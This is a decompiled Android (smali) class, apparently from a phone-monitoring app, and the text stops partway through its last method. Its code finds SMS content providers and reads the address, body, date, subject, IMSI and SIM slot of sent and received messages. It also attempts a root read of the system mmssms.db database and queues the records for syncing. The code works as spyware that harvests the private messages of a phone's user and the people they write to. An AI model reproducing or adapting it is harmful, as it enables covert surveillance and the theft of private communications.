.class public Lb/d/d/s0;
.super Lcom/utils/core/h0/k;
.source ""


# static fields
.field public static final o:Landroid/net/Uri;

.field private static p:Z

.field private static q:Z

.field private static r:Landroid/content/ContentValues;

.field public static final s:Lb/d/d/s0;


# instance fields
.field private l:Ljava/lang/String;

.field private m:[Z

.field public n:Ljava/util/ArrayList;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "content://sms/sent"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    sput-object v0, Lb/d/d/s0;->o:Landroid/net/Uri;

    const/4 v0, 0x0

    sput-boolean v0, Lb/d/d/s0;->p:Z

    sput-boolean v0, Lb/d/d/s0;->q:Z

    const/4 v0, 0x0

    sput-object v0, Lb/d/d/s0;->r:Landroid/content/ContentValues;

    new-instance v0, Lb/d/d/s0;

    invoke-direct {v0}, Lb/d/d/s0;-><init>()V

    sput-object v0, Lb/d/d/s0;->s:Lb/d/d/s0;

    return-void
.end method

.method public constructor <init>()V
    .locals 14

    const/16 v0, 0x139

    const-string v1, "sms"

    const-string v2, "ObSms"

    invoke-direct {p0, v2, v0, v1, v1}, Lcom/utils/core/h0/k;-><init>(Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)V

    const-string v2, ""

    iput-object v2, p0, Lb/d/d/s0;->l:Ljava/lang/String;

    const/4 v3, 0x3

    new-array v3, v3, [Z

    fill-array-data v3, :array_0

    iput-object v3, p0, Lb/d/d/s0;->m:[Z

    const/4 v3, 0x0

    iput-object v3, p0, Lb/d/d/s0;->n:Ljava/util/ArrayList;

    new-instance v4, Lcom/utils/core/o;

    invoke-direct {v4, p0}, Lcom/utils/core/o;-><init>(Lcom/utils/core/h0/j;)V

    iput-object v4, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    .line 1
    iget-object v4, p0, Lb/d/d/s0;->n:Ljava/util/ArrayList;

    if-nez v4, :cond_4

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    iput-object v4, p0, Lb/d/d/s0;->n:Ljava/util/ArrayList;

    :try_start_0
    sget-object v4, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    if-eqz v4, :cond_4

    const/16 v5, 0x8

    invoke-virtual {v4, v5}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v4

    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_0
    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_4

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/content/pm/PackageInfo;

    iget-object v5, v5, Landroid/content/pm/PackageInfo;->providers:[Landroid/content/pm/ProviderInfo;

    if-eqz v5, :cond_0

    array-length v6, v5

    const/4 v7, 0x0

    move-object v8, v2

    const/4 v2, 0x0

    :goto_1
    if-ge v2, v6, :cond_3

    aget-object v9, v5, v2

    iget-object v10, v9, Landroid/content/pm/ProviderInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v8, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-nez v10, :cond_2

    iget-object v10, v9, Landroid/content/pm/ProviderInfo;->readPermission:Ljava/lang/String;

    invoke-static {v10}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v10

    if-nez v10, :cond_2

    iget-object v10, v9, Landroid/content/pm/ProviderInfo;->readPermission:Ljava/lang/String;

    invoke-virtual {v10}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v10

    const-string v11, "READ_SMS"

    invoke-virtual {v10, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v10

    const/4 v11, -0x1

    if-le v10, v11, :cond_2

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v9, Landroid/content/pm/ProviderInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "!"

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    new-instance v10, Lb/d/d/r0;

    invoke-direct {v10, p0, v9, v3}, Lb/d/d/r0;-><init>(Lb/d/d/s0;Landroid/content/pm/ProviderInfo;Lb/d/d/p0;)V

    iget-object v12, p0, Lb/d/d/s0;->n:Ljava/util/ArrayList;

    invoke-virtual {v12, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    iget-object v12, p0, Lb/d/d/s0;->l:Ljava/lang/String;

    invoke-static {v12}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_1

    iget-object v12, v9, Landroid/content/pm/ProviderInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    const-string v13, "telephony"

    invoke-virtual {v12, v13}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v12

    if-le v12, v11, :cond_1

    iget-object v12, v9, Landroid/content/pm/ProviderInfo;->authority:Ljava/lang/String;

    invoke-static {v12}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_1

    iget-object v9, v9, Landroid/content/pm/ProviderInfo;->authority:Ljava/lang/String;

    invoke-virtual {v9}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v9

    if-le v9, v11, :cond_1

    iget-object v9, v10, Lb/d/d/r0;->b:Ljava/lang/String;

    iput-object v9, p0, Lb/d/d/s0;->l:Ljava/lang/String;

    :cond_1
    invoke-static {}, Lcom/utils/core/g0;->t()Z

    move-result v9

    if-eqz v9, :cond_2

    iget-object v9, v10, Lb/d/d/r0;->a:Ljava/lang/String;

    const/4 v10, 0x1

    invoke-static {v9, v0, v7, v10}, Lb/d/f/g;->a(Ljava/lang/String;IIZ)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_3
    move-object v2, v8

    goto/16 :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v2, "gSa"

    invoke-static {v1, v2, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_4
    return-void

    :array_0
    .array-data 1
        0x1t
        0x1t
        0x1t
    .end array-data
.end method

.method public static a(Landroid/database/Cursor;)I
    .locals 2

    const-string v0, "sim_imsi"

    invoke-interface {p0, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    const/4 v1, -0x1

    if-gt v0, v1, :cond_0

    const-string v0, "imsi"

    invoke-interface {p0, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    :cond_0
    return v0
.end method

.method public static a(I)Ljava/lang/String;
    .locals 2

    const-string v0, "type"

    invoke-static {v0}, Lb/a/a/a/a;->a(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const/4 v1, 0x2

    if-ne p0, v1, :cond_0

    const-string p0, " = "

    goto :goto_0

    :cond_0
    const-string p0, " <> "

    :goto_0
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static a(Landroid/database/Cursor;Landroid/content/ContentValues;[Ljava/lang/String;)V
    .locals 3

    const-string v0, "sim_slot"

    invoke-interface {p0, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-static {p0}, Lb/d/d/s0;->a(Landroid/database/Cursor;)I

    move-result v1

    const/4 v2, -0x1

    if-le v1, v2, :cond_0

    invoke-interface {p0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :cond_0
    const-string v1, ""

    :goto_0
    if-le v0, v2, :cond_1

    invoke-interface {p0, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result p0

    goto :goto_1

    :cond_1
    const/4 p0, -0x1

    :goto_1
    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    if-le p0, v2, :cond_3

    :cond_2
    invoke-static {p0, v1}, Lb/d/d/o0;->a(ILjava/lang/String;)Lb/d/a/i;

    move-result-object p0

    if-eqz p0, :cond_3

    :try_start_0
    const-string v0, "simid"

    iget v2, p0, Lb/d/a/i;->a:I

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {p1, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    iget-object v0, p0, Lb/d/a/i;->e:Ljava/lang/String;

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    const-string v0, "simop"

    iget-object p0, p0, Lb/d/a/i;->e:Ljava/lang/String;

    invoke-virtual {p1, v0, p0}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    nop

    :cond_3
    :goto_2
    if-eqz p2, :cond_4

    array-length p0, p2

    const/4 p1, 0x1

    if-ne p0, p1, :cond_4

    const/4 p0, 0x0

    aput-object v1, p2, p0

    :cond_4
    return-void
.end method

.method private a(Lb/d/e/b;[JI)V
    .locals 9

    :try_start_0
    iget-object v0, p0, Lb/d/d/s0;->m:[Z

    aget-boolean v0, v0, p3

    if-eqz v0, :cond_2

    const/4 v0, 0x1

    aget-wide v1, p2, v0

    const-wide/16 v3, -0x1

    aput-wide v3, p2, v0

    const/4 v3, 0x0

    if-ne p3, v0, :cond_0

    const/4 v4, 0x1

    goto :goto_0

    :cond_0
    const/4 v4, 0x0

    :goto_0
    invoke-virtual {p1, p2, p3, v4}, Lb/d/e/b;->a([JIZ)Ljava/util/List;

    move-result-object p1

    aget-wide v4, p2, v0

    const-wide/16 v6, 0x0

    cmp-long v8, v4, v6

    if-lez v8, :cond_1

    aget-wide v4, p2, v0

    cmp-long v0, v4, v1

    if-nez v0, :cond_1

    iget-object v0, p0, Lb/d/d/s0;->m:[Z

    aput-boolean v3, v0, p3

    :cond_1
    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_2

    .line 7
    new-instance v0, Lb/d/d/p0;

    invoke-direct {v0, p0, p2, p3}, Lb/d/d/p0;-><init>(Lb/d/d/s0;[JI)V

    iget-object p2, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    invoke-virtual {p2, p1, v0}, Lcom/utils/core/o;->a(Ljava/util/List;Lcom/utils/core/h0/b;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    .line 8
    iget-object p2, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string p3, "getR T"

    invoke-static {p2, p3, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_2
    :goto_1
    return-void
.end method

.method public static a(Ljava/util/List;Landroid/database/Cursor;Landroid/content/ContentValues;)V
    .locals 21

    move-object/from16 v1, p1

    move-object/from16 v0, p2

    const-string v2, "addV"

    const-string v3, "address"

    const-string v4, "type"

    const-string v5, "date"

    const-string v6, "subject"

    const-string v7, "_id"

    const-wide/16 v8, 0x0

    const-string v10, "body"

    const-string v11, ""

    if-eqz v1, :cond_0

    :try_start_0
    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v10}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v8

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v0

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lb/d/d/s0;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lb/d/d/s0;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lb/d/d/s0;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    move-object v6, v3

    move v3, v0

    goto :goto_0

    :cond_0
    if-eqz v0, :cond_1

    invoke-virtual {v0, v7}, Landroid/content/ContentValues;->getAsLong(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Long;->longValue()J

    move-result-wide v8

    invoke-virtual {v0, v5}, Landroid/content/ContentValues;->getAsLong(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v13

    invoke-virtual {v0, v4}, Landroid/content/ContentValues;->getAsInteger(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    invoke-virtual {v0, v6}, Landroid/content/ContentValues;->getAsString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lb/d/d/s0;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v10}, Landroid/content/ContentValues;->getAsString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lb/d/d/s0;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v3}, Landroid/content/ContentValues;->getAsString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lb/d/d/s0;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move v3, v4

    move-object v4, v5

    move-object v5, v6

    move-object v6, v0

    goto :goto_0

    :cond_1
    move-wide v13, v8

    move-object v4, v11

    move-object v5, v4

    move-object v6, v5

    const/4 v3, 0x0

    :goto_0
    invoke-static {v4}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {v5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    sget-object v0, Lb/d/d/s0;->s:Lb/d/d/s0;

    iget-object v0, v0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v1, "empty"

    invoke-static {v0, v1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    goto/16 :goto_5

    :cond_2
    const-string v7, "num"

    const-string v15, "uuid"

    const-string v12, "id_sms"

    move-object/from16 v16, v11

    const-string v11, "cat"

    move-object/from16 p2, v4

    const/4 v4, 0x1

    if-eq v3, v4, :cond_3

    :try_start_1
    sget-object v0, Lb/d/d/s0;->r:Landroid/content/ContentValues;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-eqz v0, :cond_3

    :try_start_2
    sget-object v0, Lb/d/d/s0;->r:Landroid/content/ContentValues;

    invoke-virtual {v0, v11}, Landroid/content/ContentValues;->getAsInteger(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    if-eq v0, v3, :cond_3

    sget-object v0, Lb/d/d/s0;->r:Landroid/content/ContentValues;

    invoke-virtual {v0, v12}, Landroid/content/ContentValues;->getAsLong(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v17

    cmp-long v0, v13, v17

    if-lez v0, :cond_3

    sub-long v17, v13, v17

    const-wide/32 v19, 0xea60

    cmp-long v0, v17, v19

    if-gez v0, :cond_3

    sget-object v0, Lb/d/d/s0;->r:Landroid/content/ContentValues;

    invoke-virtual {v0, v10}, Landroid/content/ContentValues;->getAsString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lb/d/d/s0;->r:Landroid/content/ContentValues;

    invoke-virtual {v0, v7}, Landroid/content/ContentValues;->getAsString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    if-eqz v0, :cond_3

    const/4 v0, 0x2

    :try_start_3
    invoke-static {v8, v9, v0}, Lcom/utils/core/g0;->b(JI)V

    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    invoke-virtual {v0, v11, v8}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    sget-object v8, Lb/d/d/s0;->s:Lb/d/d/s0;

    iget-object v8, v8, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    sget-object v9, Lb/d/d/s0;->r:Landroid/content/ContentValues;

    invoke-virtual {v9, v15}, Landroid/content/ContentValues;->getAsString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v0, v9}, Lcom/utils/core/o;->a(Landroid/content/ContentValues;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    const/4 v0, 0x1

    goto :goto_2

    :catch_0
    move-exception v0

    const/4 v8, 0x1

    goto :goto_1

    :catch_1
    move-exception v0

    const/4 v8, 0x0

    :goto_1
    :try_start_4
    sget-object v9, Lb/d/d/s0;->s:Lb/d/d/s0;

    iget-object v9, v9, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    invoke-static {v9, v2, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    move v0, v8

    goto :goto_2

    :cond_3
    const/4 v0, 0x0

    :goto_2
    if-nez v0, :cond_e

    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    if-eqz v1, :cond_4

    const/4 v8, 0x0

    invoke-static {v1, v0, v8}, Lb/d/d/s0;->a(Landroid/database/Cursor;Landroid/content/ContentValues;[Ljava/lang/String;)V

    :cond_4
    invoke-static {v13, v14}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v0, v12, v1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    invoke-static {v13, v14}, Lcom/utils/core/u;->a(J)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v15, v1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v0, v11, v1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    invoke-static {v6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_5

    const-string v6, " "

    move-object/from16 v11, v16

    goto :goto_3

    :cond_5
    invoke-static {v6}, Lb/d/d/t;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_6

    const-string v1, "name"

    invoke-virtual {v0, v1, v11}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    :cond_6
    :goto_3
    invoke-virtual {v0, v7, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Lb/d/d/s0;->s:Lb/d/d/s0;

    iget-object v1, v1, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "ins tp-"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v8, "; ad-"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "; sb-"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v8, 0x5

    move-object/from16 v9, p2

    invoke-static {v9, v8}, Lcom/utils/core/u;->a(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "; bd-"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v8, 0x5

    invoke-static {v5, v8}, Lcom/utils/core/u;->a(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "; cnt-"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v1, v7}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_c

    if-ne v4, v3, :cond_b

    .line 1
    invoke-static {v6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_8

    const/4 v1, 0x0

    const/4 v12, 0x0

    :goto_4
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v7

    if-ge v1, v7, :cond_9

    invoke-virtual {v6, v1}, Ljava/lang/String;->charAt(I)C

    move-result v7

    invoke-static {v7}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v7

    const-string v8, "[0-9]+"

    invoke-virtual {v7, v8}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_7

    add-int/lit8 v12, v12, 0x1

    :cond_7
    add-int/lit8 v1, v1, 0x1

    goto :goto_4

    :cond_8
    const/4 v12, 0x0

    :cond_9
    const/4 v1, 0x7

    if-ge v12, v1, :cond_b

    .line 2
    invoke-static {}, Lcom/utils/core/u;->o()Z

    move-result v1

    if-eqz v1, :cond_a

    const/4 v1, 0x2

    invoke-static {}, Lcom/utils/core/g0;->F()I

    move-result v7

    if-eq v1, v7, :cond_b

    :cond_a
    sget-object v1, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    const v5, 0x7f0c0082

    invoke-virtual {v1, v5}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v5

    sget-object v1, Lb/d/d/s0;->s:Lb/d/d/s0;

    iget-object v1, v1, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "sms num \'"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "\' !10dig"

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v1, v6}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_b
    invoke-virtual {v0, v10, v5}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    :cond_c
    invoke-static {v9}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_d

    const-string v1, "subj"

    invoke-virtual {v0, v1, v9}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    :cond_d
    move-object/from16 v1, p0

    invoke-interface {v1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    if-eq v3, v4, :cond_e

    sput-object v0, Lb/d/d/s0;->r:Landroid/content/ContentValues;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_5

    :catch_2
    move-exception v0

    sget-object v1, Lb/d/d/s0;->s:Lb/d/d/s0;

    iget-object v1, v1, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    invoke-static {v1, v2, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_e
    :goto_5
    return-void
.end method

.method private a([J[J)V
    .locals 6

    :try_start_0
    iget-object v0, p0, Lb/d/d/s0;->m:[Z

    const/4 v1, 0x1

    aget-boolean v0, v0, v1

    const/4 v2, 0x2

    if-nez v0, :cond_0

    iget-object v0, p0, Lb/d/d/s0;->m:[Z

    aget-boolean v0, v0, v2

    if-eqz v0, :cond_2

    :cond_0
    invoke-static {}, Lcom/utils/core/d0;->j()Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Lb/d/e/b;

    iget-object v3, p0, Lb/d/d/s0;->l:Ljava/lang/String;

    invoke-direct {v0, v3}, Lb/d/e/b;-><init>(Ljava/lang/String;)V

    .line 5
    invoke-virtual {v0}, Lb/d/e/b;->d()Ljava/util/ArrayList;

    move-result-object v3

    const-string v4, "RtRdSm"

    const-string v5, "mmssms.db"

    invoke-virtual {v0, v4, v5, v3}, Lcom/utils/core/q;->a(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 6
    invoke-direct {p0, v0, p1, v1}, Lb/d/d/s0;->a(Lb/d/e/b;[JI)V

    invoke-direct {p0, v0, p2, v2}, Lb/d/d/s0;->a(Lb/d/e/b;[JI)V

    goto :goto_0

    :cond_1
    iget-object p1, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string p2, "R: n chn "

    invoke-static {p1, p2}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    iget-object p2, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v0, "getR"

    invoke-static {p2, v0, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_2
    :goto_0
